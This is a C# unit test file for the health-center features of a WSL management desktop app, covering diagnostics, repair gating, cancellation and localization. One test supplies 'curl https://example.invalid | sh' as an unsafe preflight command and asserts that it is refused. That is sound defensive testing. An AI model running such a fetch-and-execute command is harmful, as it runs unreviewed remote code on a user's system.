        var logs = new Mock<IDiagnosticLogProvider>(); logs.SetupGet(x => x.AllowedLogIds).Returns([]);
        var errors = new Mock<IStructuredErrorProvider>();
        var report = new DiagnosticReportService(health.Object, capabilities.Object, logs.Object, errors.Object);

        await Assert.ThrowsAnyAsync<OperationCanceledException>(() => report.PreviewAsync(new DiagnosticReportRequest(DiagnosticReportFormat.Json, true), cancellation.Token));
        capabilities.Verify(x => x.GetHostSnapshotAsync(It.IsAny<bool>(), cancellation.Token), Times.Once);
        health.Verify(x => x.ScanAsync(It.IsAny<IProgress<HealthFinding>>(), It.IsAny<CancellationToken>()), Times.Never);
    }

    [Fact]
    public void HealthCenterDi_RegistersConcreteDiagnosticProvidersAndRepairActions()
    {
        var services = new ServiceCollection();
        services.AddHealthCenter();
        var log = Assert.Single(services, x => x.ServiceType == typeof(IDiagnosticLogProvider));
        var error = Assert.Single(services, x => x.ServiceType == typeof(IStructuredErrorProvider));
        Assert.NotEqual(typeof(EmptyDiagnosticLogProvider), log.ImplementationType);
        Assert.Equal(typeof(StructuredFileErrorProvider), error.ImplementationType);
        Assert.Contains(services, x => x.ServiceType == typeof(IRepairAction) && x.ImplementationType == typeof(InstanceConfigurationRepairAction));
        Assert.Contains(services, x => x.ServiceType == typeof(IRepairAction) && x.ImplementationType == typeof(ElevationRequiredRepairAction));
        Assert.Contains(services, x => x.ServiceType == typeof(ITemplateRuntimePreflightEvaluator) && x.ImplementationType == typeof(TemplateRuntimePreflightEvaluator));
    }

    [Fact]
    public async Task TemplateRuntimePreflightEvaluator_RunsOnlySafeRecordedContracts()
    {
        var runner = new RecordingRunner(new ProcessResult(0, "", "", TimeSpan.Zero, false, false, false, 1));
        var record = new TemplateApplicationRecord
        {
            Id = "install-1", TemplateId = "dev", InstanceName = "Ubuntu", Success = true,
            DeclaredHealthSnapshot = new TemplateDeclaredHealthSnapshot(true, [], [], [], "1.0", RuntimePreflightContracts: [
                new TemplateRuntimePreflightContract("safe", true, "test -f /etc/os-release"),
                new TemplateRuntimePreflightContract("unsafe", true, "curl https://example.invalid | sh")])
        };

        var results = await new TemplateRuntimePreflightEvaluator(runner).EvaluateAsync(record);

        Assert.Collection(results,
            safe => { Assert.Equal("safe", safe.Id); Assert.Equal("healthy", safe.State); },
            unsafeResult => { Assert.Equal("unsafe", unsafeResult.Id); Assert.Equal("unavailable", unsafeResult.State); });
        var request = Assert.Single(runner.Requests);
        Assert.Equal("wsl.exe", request.FileName);
        Assert.Equal(["--distribution", "Ubuntu", "--", "sh", "-lc", "test -f /etc/os-release"], request.Arguments);
    }

    [Fact]
    public void HealthCenterViewModel_ExposesAndSelectsOnlyAvailableDiagnosticLogs()
    {
        var module = new Mock<IPowerShellModuleClient>(); module.Setup(x => x.GetDiagnosticLogOptionsAsync(It.IsAny<CancellationToken>())).ReturnsAsync(["app:current"]);
        using var viewModel = new HealthCenterViewModel(module.Object);
        viewModel.AvailableLogIds.Add("app:current");

        viewModel.ToggleDiagnosticLogCommand.Execute("app:current");
        viewModel.ToggleDiagnosticLogCommand.Execute("not-allowed");

        Assert.Equal(["app:current"], viewModel.SelectedLogIds);
        viewModel.Status = "DN-7005: failed";
        Assert.Equal("DN-7005", viewModel.StatusCode); Assert.True(viewModel.HasStatusCode);
    }

    [Fact]
    public async Task HealthCenterViewModel_UnsupportedWslLocalizesAvailabilityAndGatesAllActions()
    {
        var health = new Mock<IHealthOrchestrator>();
        var repairs = new Mock<IHealthRepairService>();
        var reports = new Mock<IDiagnosticReportService>();
        var logs = new Mock<IDiagnosticLogProvider>(); logs.SetupGet(x => x.AllowedLogIds).Returns([]);
        var capabilities = new Mock<IPowerShellModuleClient>();
        capabilities.Setup(x => x.GetHostCapabilitiesAsync(It.IsAny<CancellationToken>()))
            .ReturnsAsync(HostWithWsl(CapabilityStatus.Unavailable, "Capability.Probe.ExecutableMissing"));
        using var viewModel = new HealthCenterViewModel(capabilities.Object);

        await viewModel.InitializeAsync();
        await viewModel.RescanCommand.ExecuteAsync(null);
        await viewModel.ExportDiagnosticsCommand.ExecuteAsync(null);

        Assert.False(viewModel.IsHealthAvailable);
        Assert.False(viewModel.CanRunHealthActions);
        Assert.Contains("Health scanning", viewModel.HealthAvailabilityReason, StringComparison.OrdinalIgnoreCase);
        health.Verify(x => x.ScanAsync(It.IsAny<IProgress<HealthFinding>>(), It.IsAny<CancellationToken>()), Times.Never);
        reports.Verify(x => x.PreviewAsync(It.IsAny<DiagnosticReportRequest>(), It.IsAny<CancellationToken>()), Times.Never);
    }

    [Fact]
    public async Task HealthCenterViewModel_ScanReportsProgressAndCancellationToTheServiceToken()
    {
        var health = SupportedCapabilities();
        var started = new TaskCompletionSource(TaskCreationOptions.RunContinuationsAsynchronously);
        health.Setup(x => x.ScanHealthAsync(It.IsAny<CancellationToken>()))
            .Returns<CancellationToken>(async token =>
            {
                started.TrySetResult();
                await Task.Delay(Timeout.InfiniteTimeSpan, token);
                return default!;
            });
        using var viewModel = new HealthCenterViewModel(health.Object);

        var task = viewModel.RescanCommand.ExecuteAsync(null);
        await started.Task.WaitAsync(TimeSpan.FromSeconds(5));
        Assert.True(viewModel.IsScanning);
        Assert.True(viewModel.IsBusy);
        Assert.False(viewModel.CanRunHealthActions);
        viewModel.CancelScanCommand.Execute(null);
        await task;

        Assert.False(viewModel.IsScanning);
        Assert.Contains("cancel", viewModel.Status, StringComparison.OrdinalIgnoreCase);
        Assert.Empty(viewModel.Findings);
    }

    [Fact]
    public async Task HealthCenterViewModel_ReportCancellationAndSelectedLogsAreForwardedAsRedactedRequest()
    {
        var reports = SupportedCapabilities();
        var started = new TaskCompletionSource(TaskCreationOptions.RunContinuationsAsynchronously);
        IReadOnlyList<string>? received = null;
        reports.Setup(x => x.GetDiagnosticReportPreviewAsync(It.IsAny<DiagnosticReportFormat>(), It.IsAny<IReadOnlyList<string>>(), It.IsAny<CancellationToken>()))
            .Returns<DiagnosticReportFormat, IReadOnlyList<string>, CancellationToken>(async (_, request, token) =>
            {
                received = request;
                started.TrySetResult();
                await Task.Delay(Timeout.InfiniteTimeSpan, token);
                return default!;
            });
        reports.Setup(x => x.GetDiagnosticLogOptionsAsync(It.IsAny<CancellationToken>())).ReturnsAsync(["app:current"]);
        using var viewModel = new HealthCenterViewModel(reports.Object); viewModel.AvailableLogIds.Add("app:current");
        viewModel.ToggleDiagnosticLogCommand.Execute("app:current");

        var task = viewModel.ExportDiagnosticsCommand.ExecuteAsync(null);
        await started.Task.WaitAsync(TimeSpan.FromSeconds(5));
        Assert.True(viewModel.IsReporting);
        Assert.True(viewModel.RedactDiagnostic);
        Assert.Equal(["app:current"], received);
        viewModel.CancelReportCommand.Execute(null);
        await task;

        Assert.False(viewModel.IsReporting);
        Assert.Contains("cancel", viewModel.Status, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public async Task HealthCenterViewModel_RepairIsGatedWhenUnavailableAndExecutesSafePreviewWhenAvailable()
    {
        var repairs = SupportedCapabilities();
        var finding = new HealthFinding("config.dns", HealthSeverity.Warning, HealthScope.Host, "DNS", "detail", RepairId: "config.global");
        repairs.Setup(x => x.GetHealthRepairPreviewAsync(finding, It.IsAny<CancellationToken>()))
            .ReturnsAsync(new RepairPreview("config.global", "Fix DNS", RepairSafety.Safe, RepairIdempotency.Idempotent, ["Change DNS"], [], PreviewToken: "preview"));
        repairs.Setup(x => x.RepairHealthAsync("preview", It.IsAny<CancellationToken>()))
            .ReturnsAsync(new RepairResult("config.global", true, ["fixed"]));
        var unavailable = new Mock<IPowerShellModuleClient>();
        unavailable.Setup(x => x.GetHostCapabilitiesAsync(It.IsAny<CancellationToken>())).ReturnsAsync(HostWithWsl(CapabilityStatus.Unavailable, "missing"));
        using var blocked = new HealthCenterViewModel(unavailable.Object);
        await blocked.InitializeAsync();
        await blocked.RepairCommand.ExecuteAsync(new HealthFindingViewModel(finding));
        repairs.Verify(x => x.GetHealthRepairPreviewAsync(It.IsAny<HealthFinding>(), It.IsAny<CancellationToken>()), Times.Never);

        using var available = new HealthCenterViewModel(repairs.Object);
        await available.RepairCommand.ExecuteAsync(new HealthFindingViewModel(finding));
        repairs.Verify(x => x.RepairHealthAsync("preview", It.IsAny<CancellationToken>()), Times.Once);
        Assert.Contains("fixed", available.RepairDetails);
    }

    [Fact]
    public void HealthResources_ProvideEveryHealthKeyInBothSupportedCultures()
    {
        var root = FindRepositoryRoot();
        var english = ReadResourceNames(Path.Combine(root, "src", "Client", "DistroNexus.Desktop", "Properties", "Resources.resx"));
        var chinese = ReadResourceNames(Path.Combine(root, "src", "Client", "DistroNexus.Desktop", "Properties", "Resources.zh-CN.resx"));
        var healthKeys = english.Where(x => x.StartsWith("Health_", StringComparison.Ordinal)).ToArray();

        Assert.NotEmpty(healthKeys);
        Assert.Empty(healthKeys.Where(key => !chinese.Contains(key)));
    }

    [Fact]
    public void HealthResources_ProvideStablePresenterCategoriesAndErrorCodes()
    {
        var root = FindRepositoryRoot();
        var english = ReadResourceNames(Path.Combine(root, "src", "Client", "DistroNexus.Desktop", "Properties", "Resources.resx"));
        var categories = new[] { "Wsl", "Kernel", "Wslg", "Network", "Proxy", "Vpn", "Template", "Windows", "Configuration", "Unknown" };
        foreach (var category in categories)
        {
            Assert.Contains("Health_Finding" + category + "Title", english);
            Assert.Contains("Health_Finding" + category + "Detail", english);
        }
        foreach (var code in Enumerable.Range(7001, 7)) Assert.Contains("Health_Error_DN" + code, english);
    }

    private static HealthCenterViewModel CreateViewModel(Mock<IHealthOrchestrator>? health = null, Mock<IHealthRepairService>? repairs = null,
        Mock<IDiagnosticReportService>? reports = null, Mock<IDiagnosticLogProvider>? logs = null, Mock<IPowerShellModuleClient>? capabilities = null)
    {
        health ??= new Mock<IHealthOrchestrator>();
        repairs ??= new Mock<IHealthRepairService>();
        reports ??= new Mock<IDiagnosticReportService>();
        if (logs is null)
        {
            logs = new Mock<IDiagnosticLogProvider>();
            logs.SetupGet(x => x.AllowedLogIds).Returns([]);
        }
        return new HealthCenterViewModel(capabilities?.Object ?? SupportedCapabilities().Object);
    }
    private static Mock<IPowerShellModuleClient> SupportedCapabilities()
    {
        var capabilities = new Mock<IPowerShellModuleClient>();
        capabilities.Setup(x => x.GetHostCapabilitiesAsync(It.IsAny<CancellationToken>())).ReturnsAsync(HostWithWsl(CapabilityStatus.Supported, "Capability.Probe.Supported"));
        return capabilities;
    }
    private static PlatformCapabilitySnapshot HostWithWsl(CapabilityStatus status, string reason) => new(
        new HostPlatformFacts("Windows", new Version(10, 0), "x64", false, null, null, null, null, false),
        new Dictionary<CapabilityId, CapabilityResult> { [CapabilityId.Wsl] = new(CapabilityId.Wsl, status, reason, CapabilitySource.WslCli, DateTimeOffset.UtcNow) },
        new Dictionary<CapabilityId, CapabilityResult>(), DateTimeOffset.UtcNow);
    private static string FindRepositoryRoot()
    {
        for (var directory = new DirectoryInfo(AppContext.BaseDirectory); directory is not null; directory = directory.Parent)
            if (File.Exists(Path.Combine(directory.FullName, "AGENTS.md"))) return directory.FullName;
        throw new DirectoryNotFoundException("Repository root was not found.");
    }
    private static HashSet<string> ReadResourceNames(string path) => System.Xml.Linq.XDocument.Load(path).Root!
        .Elements("data").Select(x => (string?)x.Attribute("name")).Where(x => x is not null).Select(x => x!).ToHashSet(StringComparer.Ordinal);
    private static HealthCheckContext Context() => new(Host(), []);
    private static PlatformCapabilitySnapshot Host() => new(new HostPlatformFacts("Windows", new Version(10, 0), "x64", false, null, null, null, null, false), new Dictionary<CapabilityId, CapabilityResult>(), new Dictionary<CapabilityId, CapabilityResult>(), DateTimeOffset.UtcNow);
    private sealed class RecordingRunner(params ProcessResult[] results) : IProcessRunner
    {
        private readonly Queue<ProcessResult> _results = new(results);
        public List<ProcessRequest> Requests { get; } = [];
        public Task<ProcessResult> RunAsync(ProcessRequest request, CancellationToken cancellationToken = default)
        {
            Requests.Add(request);
            return Task.FromResult(_results.Count == 0 ? new ProcessResult(null, "", "not configured", TimeSpan.Zero, false, false, false, null, ProcessFailureKind.StartFailed) : _results.Dequeue());
        }
    }
}
